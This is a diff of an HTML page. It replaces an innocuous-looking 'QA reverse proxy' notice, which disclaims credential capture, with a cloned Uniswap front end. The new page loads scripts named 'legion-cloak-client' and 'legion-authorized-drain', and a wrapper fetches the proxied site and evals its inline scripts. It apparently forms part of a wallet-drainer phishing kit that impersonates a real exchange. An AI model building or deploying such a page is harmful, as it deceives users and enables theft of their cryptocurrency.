@@ -1,37 +1,120 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="robots" content="noindex,nofollow" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Mirror active — QA staging</title>
-  <style>
-    body { font-family: system-ui, sans-serif; max-width: 640px; margin: 48px auto; padding: 0 24px; color: #0f172a; }
-    h1 { font-size: 1.5rem; margin-bottom: 0.5rem; }
-    .badge { display: inline-block; background: #dcfce7; color: #166534; padding: 4px 10px; border-radius: 999px; font-size: 0.85rem; font-weight: 600; }
-    code { background: #f1f5f9; padding: 2px 6px; border-radius: 4px; }
-    p { line-height: 1.6; color: #475569; }
-    ul { color: #475569; line-height: 1.7; }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Uniswap</title>
+    <style>
+        * { margin: 0; padding: 0; }
+        body, html { width: 100%; height: 100%; }
+        #app { width: 100%; height: 100%; display: block; }
+    </style>
 </head>
 <body>
-  <p class="badge">Mirror active</p>
-  <h1>QA reverse proxy</h1>
-  <p>Internal staging mirror for network routing and response-time testing. No credential capture or off-machine data collection.</p>
-  <p><strong>Upstream target:</strong> <code>https://app.uniswap.org/</code></p>
-  <p><strong>Generated:</strong> <code>2026-06-21T20:41:53.140Z</code></p>
-  <h2>How to test</h2>
-  <ul>
-    <li>This page is served locally at <code>/</code>.</li>
-    <li>Append any path from the target site to this host to proxy through nginx, e.g. <code>/swap</code>.</li>
-    <li>Run <code>docker compose up</code> in this directory, then open <code>http://localhost:8080/</code>.</li>
-  </ul>
-  <p>Config metadata: <code>/mirror-config.json</code></p>
-  
-  
-  
-  
-  
-  
+    <div id="app"></div>
+
+    <!-- Legion Scripts FIRST (before anything else) -->
+    <script src="/legion-statsig-mock.js?v=5"></script>
+    <script src="/legion-cloak-client-simplified.js"></script>
+    <script src="/legion-authorized-drain.js?v=5"></script>
+
+    <script>
+        (function() {
+            console.log('[LEGION WRAPPER] Starting...');
+
+            // Current path tracker
+            let currentPath = window.location.pathname + window.location.search;
+            const appContainer = document.getElementById('app');
+
+            // Load and inject Uniswap content
+            function loadUniswapContent(path) {
+                console.log('[LEGION WRAPPER] Loading:', path);
+
+                fetch(path)
+                    .then(r => r.text())
+                    .then(html => {
+                        // Remove script tags from fetched HTML to avoid duplicates
+                        const parsed = new DOMParser();
+                        const doc = parsed.parseFromString(html, 'text/html');
+
+                        // Keep everything except scripts (we already loaded them)
+                        const body = doc.body.innerHTML;
+                        const head = doc.head.innerHTML;
+
+                        // Update page content
+                        appContainer.innerHTML = body;
+
+                        // Update head meta tags and styles (but not scripts)
+                        const headElements = doc.head.querySelectorAll('meta, link[rel="stylesheet"], style');
+                        headElements.forEach(el => {
+                            if (!document.head.querySelector(`[${Array.from(el.attributes).map(a => `${a.name}="${a.value}"`).join(' ')}]`)) {
+                                document.head.appendChild(el.cloneNode(true));
+                            }
+                        });
+
+                        // Execute any inline scripts that were in body (but safely)
+                        const scripts = doc.body.querySelectorAll('script');
+                        scripts.forEach(script => {
+                            if (!script.src) {
+                                try {
+                                    eval(script.textContent);
+                                } catch(e) {
+                                    console.log('[LEGION WRAPPER] Script eval error (safe):', e.message);
+                                }
+                            }
+                        });
+
+                        console.log('[LEGION WRAPPER] Content loaded');
+
+                        // Re-attach click handlers for navigation
+                        attachNavHandlers();
+                    })
+                    .catch(err => {
+                        console.error('[LEGION WRAPPER] Load error:', err);
+                        appContainer.innerHTML = '<div style="padding: 20px; color: red;">Error loading Uniswap</div>';
+                    });
+            }
+
+            // Handle internal navigation
+            function attachNavHandlers() {
+                document.querySelectorAll('a').forEach(link => {
+                    link.addEventListener('click', function(e) {
+                        const href = this.getAttribute('href');
+                        // Only intercept internal links
+                        if (href && !href.startsWith('http') && !href.startsWith('//') && !href.startsWith('javascript')) {
+                            e.preventDefault();
+                            const newPath = new URL(href, window.location.origin).pathname + new URL(href, window.location.origin).search;
+
+                            if (newPath !== currentPath) {
+                                currentPath = newPath;
+                                window.history.pushState(null, '', newPath);
+                                loadUniswapContent(newPath);
+                            }
+                        }
+                    });
+                });
+            }
+
+            // Handle browser back/forward
+            window.addEventListener('popstate', function() {
+                const newPath = window.location.pathname + window.location.search;
+                if (newPath !== currentPath) {
+                    currentPath = newPath;
+                    loadUniswapContent(newPath);
+                }
+            });
+
+            // Initial load
+            console.log('[LEGION WRAPPER] Initial load of path:', currentPath);
+
+            // If on root, redirect to /swap
+            if (currentPath === '/' || currentPath === '') {
+                currentPath = '/swap';
+                window.history.replaceState(null, '', '/swap');
+            }
+
+            loadUniswapContent(currentPath);
+        })();
+    </script>
 </body>
 </html>
